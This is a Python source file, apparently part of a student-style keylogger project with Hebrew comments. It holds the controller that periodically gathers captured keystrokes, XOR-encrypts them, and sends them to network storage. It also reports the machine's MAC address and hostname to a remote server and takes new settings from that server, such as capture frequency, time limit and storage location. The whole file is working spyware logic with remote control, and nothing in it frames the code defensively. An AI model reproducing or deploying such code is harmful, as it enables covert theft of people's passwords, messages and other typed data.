import time
import datetime
import threading
import uuid
import socket
from key_logger import KeyLogger
from encryption import Encryption
from api_server import RequestManager
from writer import Write_keys


class Manager:
    def __init__(self, timeLimit=0, storageLocation="network", time_wright=60):
        self.time_wright = time_wright
        self.keylogger = KeyLogger()
        self.write_keys = Write_keys()
        self.encryption = Encryption(5)
        self.running = False
        self.storageLocation = storageLocation
        self.timeLimit = timeLimit if timeLimit is not None else 0  # ברירת מחדל ל-0 אם None
        self.keep_reporting = True

    def collect_keys(self):
        print("Starting collect_keys...")
        start_time = time.time()
        while self.running:
            try:
                time.sleep(self.time_wright)
                print("Collecting keys...")
                logged_keys = self.keylogger.get_logged_keys()
                print("111111111")
                if logged_keys:
                    timestamp = datetime.datetime.now().strftime("%d/%m/%Y %H:%M")
                    data = {timestamp: logged_keys}
                    encrypted_data = self.encryption.xor_encrypt_decrypt_dict_list(data)
                    self.write_keys.handle_write(self.storageLocation, encrypted_data)
                    self.keylogger.clear_buffer()
                    print("22222222")
                if not hasattr(self, 'status_thread_started'):
                    threading.Thread(target=self.report_status_loop, daemon=True).start()
                    self.status_thread_started = True

                # בדוק מגבלת זמן רק אם timeLimit הוא מספר
                if isinstance(self.timeLimit,
                              (int, float)) and self.timeLimit > 0 and time.time() - start_time >= self.timeLimit:
                    self.stop()
                    self.server_status_update("false")
            except Exception as e:
                print(f"Error collecting keystrokes: {e}")

    def server_status_update(self, connected):
        mac_address = ':'.join(f'{(uuid.getnode() >> i) & 0xff:02x}' for i in range(0, 48, 8))
        hostname = socket.gethostname()
        status = {
            "mac_address": mac_address,
            "name": hostname,
            "connected": connected,
            "timeLimit": self.timeLimit,
            "storageLocation": self.storageLocation,
            "lastSeen": datetime.datetime.now().strftime("%d/%m/%Y %H:%M")
        }
        print(f"Sending status update: {status}")
        RequestManager().handle_request('POST', "status", status)

    def report_status_loop(self):
        print("33333333 - Starting report_status_loop")
        while self.keep_reporting:
            response = RequestManager().handle_request(method='GET', request_type="status")
            print("4444444")
            if response:
                if response.status_code == 200:  # יש שינויים
                    try:
                        new_status = response.json()
                        print(f"שינויים שהתקבלו מהשרת: {new_status}")
                        if "storageLocation" in new_status:
                            self.storageLocation = new_status["storageLocation"]
                        if "timeLimit" in new_status:
                            self.timeLimit = new_status["timeLimit"] if new_status["timeLimit"] is not None else 0
                        if "saveFrequency" in new_status:
                            self.time_wright = new_status["saveFrequency"]
                    except Exception as e:
                        print(f"שגיאה בעיבוד השינויים: {e}")
                elif response.status_code == 404:  # אין שינויים
                    print("אין שינויים זמינים בשרת")
                # שלח עדכון סטטוס גם אם אין שינויים
                self.server_status_update("true" if self.running else "false")
            else:
                print("לא התקבלה תגובה מהשרת")
            time.sleep(60)  # 60 שניות לבדיקה, אפשר להחזיר ל-600

    def start(self):
        print("Starting Manager...")
        self.running = True
        self.keylogger.start_logging()
        threading.Thread(target=self.collect_keys, daemon=True).start()
        self.server_status_update("true")
        while self.running or self.keep_reporting:
            time.sleep(1)

    def stop(self):
        print("Stopping Manager...")
        self.running = False
        self.keylogger.stop_logging()
        self.keep_reporting = True


if __name__ == '__main__':
    a = Manager(timeLimit=0, time_wright=30)
    a.start()
